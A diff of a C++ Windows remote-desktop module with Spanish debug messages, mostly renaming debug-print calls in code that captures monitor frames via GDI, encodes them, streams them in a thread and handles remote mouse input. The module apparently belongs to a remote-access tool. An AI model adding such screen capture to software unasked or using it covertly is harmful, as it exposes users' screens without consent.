@@ -115,11 +115,11 @@ void mod_RemoteDesktop::m_RemoteMouse(int x, int y, int monitor_index, int mouse
         */
         //UINT uSent = SendInput(ARRAYSIZE(inputs), inputs, sizeof(INPUT));
         //if (uSent != ARRAYSIZE(inputs)) {
-        //   DebugPrint("SendInput failed: 0x", HRESULT_FROM_WIN32(GetLastError()));
+        //   _DBG_("SendInput failed: 0x", HRESULT_FROM_WIN32(GetLastError()));
         //}
         
     }else {
-        DebugPrint("[X] El monitor seleccionado no existe", monitor_index);
+        _DBG_("[X] El monitor seleccionado no existe", monitor_index);
     }
 }
 
@@ -170,21 +170,21 @@ std::vector<char> mod_RemoteDesktop::getFrameBytes(ULONG quality, int index) {
 
     Monitor monitor = this->m_GetMonitor(index);
     if (monitor.rectData.resHeight == 0) {
-        DebugPrint("[X] El monitor no es valido o no se ha obtenido al lista");
+        __DBG_("[X] El monitor no es valido o no se ha obtenido al lista");
         return cBuffer;
     }
     
     if (!this->isGDIon) {
-        DebugPrint("GDI no esta inicializado, init...");
+        __DBG_("GDI no esta inicializado, init...");
         this->InitGDI();
         if (!this->isGDIon) {
-            DebugPrint("[X] No se pudo iniciar...");
+            __DBG_("[X] No se pudo iniciar...");
             return cBuffer;
         }
     }
     
     HDC hdcMonitor = GetDC(NULL);
-    HDC hdcMemDC;
+    HDC hdcMemDC = NULL;
     HWND hDesktopWnd = GetDesktopWindow();
     HBITMAP hmpScreen = NULL;
 
@@ -208,27 +208,27 @@ std::vector<char> mod_RemoteDesktop::getFrameBytes(ULONG quality, int index) {
     }
 
     if (!hdcMonitor) {
-        DebugPrint("GetDC failed\n");
+        __DBG_("GetDC failed\n");
         goto EndSec;
     }
 
     hdcMemDC = CreateCompatibleDC(hdcMonitor);
     if (!hdcMemDC) {
-        DebugPrint("GetcomtabielDC failed\n");
+        __DBG_("GetcomtabielDC failed\n");
         goto EndSec;
     }
 
     hmpScreen = CreateCompatibleBitmap(hdcMonitor, monitor.rectData.resWidth, monitor.rectData.resHeight);
     if (!hmpScreen) {
-        DebugPrint("Createcompatiblebitmap failed\n");
+        __DBG_("Createcompatiblebitmap failed\n");
         goto EndSec;
     }
     if (!SelectObject(hdcMemDC, hmpScreen)) {
-        DebugPrint("select object failed\n");
+        __DBG_("select object failed\n");
         goto EndSec;
     }
     if (!BitBlt(hdcMemDC, 0, 0, monitor.rectData.resWidth, monitor.rectData.resHeight, hdcMonitor, monitor.rectData.xStart, monitor.rectData.yStart, SRCCOPY)) {
-        DebugPrint("bitblt failed\n");
+        __DBG_("bitblt failed\n");
         goto EndSec;
     }
 
@@ -247,7 +247,7 @@ std::vector<char> mod_RemoteDesktop::getFrameBytes(ULONG quality, int index) {
 
     hr = CreateStreamOnHGlobal(hGlobalMem, TRUE, &oStream);
     if (hr != S_OK) {
-        DebugPrint("CreateStreamOnHGlobal error\n");
+        __DBG_("CreateStreamOnHGlobal error\n");
         goto EndSec;
     }
 
@@ -266,12 +266,12 @@ std::vector<char> mod_RemoteDesktop::getFrameBytes(ULONG quality, int index) {
     pScreenShot = new Gdiplus::Bitmap(hmpScreen, (HPALETTE)NULL);
 
     if (!pScreenShot) {
-        DebugPrint("No se pudo reservar memoria para crear el bitmap");
+        __DBG_("No se pudo reservar memoria para crear el bitmap");
         goto EndSec;
     }
 
     if (pScreenShot->Save(oStream, &imageCLSID, &encoderParams) != Gdiplus::Status::Ok) {
-        DebugPrint("No se pudo guardar el buffer al stream");
+        __DBG_("No se pudo guardar el buffer al stream");
         goto EndSec;
     }
 
@@ -313,15 +313,15 @@ void mod_RemoteDesktop::SpawnThread(int quality, int monitor_index) {
 }
 
 void mod_RemoteDesktop::DetenerLive() {
-    DebugPrint("[RD] Apagando...");
+    __DBG_("[RD] Apagando...");
     std::unique_lock<std::mutex> lock(this->mtx_RemoteDesktop);
     this->isRunning = false;
     lock.unlock();
-    DebugPrint("[RD] Joining thread...");
+    __DBG_("[RD] Joining thread...");
     if (this->th_RemoteDesktop.joinable()) {
         this->th_RemoteDesktop.join();
     }
-    DebugPrint("[RD] Done omar :v");
+    __DBG_("[RD] Done omar :v");
 }
 
 void mod_RemoteDesktop::IniciarLive(int quality, int monitor_index) {
@@ -343,7 +343,7 @@ void mod_RemoteDesktop::IniciarLive(int quality, int monitor_index) {
                 break;
             }
         }else {
-            DebugPrint("Hubo un error creando el buffer. Esperando...");
+            __DBG_("Hubo un error creando el buffer. Esperando...");
             std::this_thread::sleep_for(std::chrono::milliseconds(1000));
         }
     }
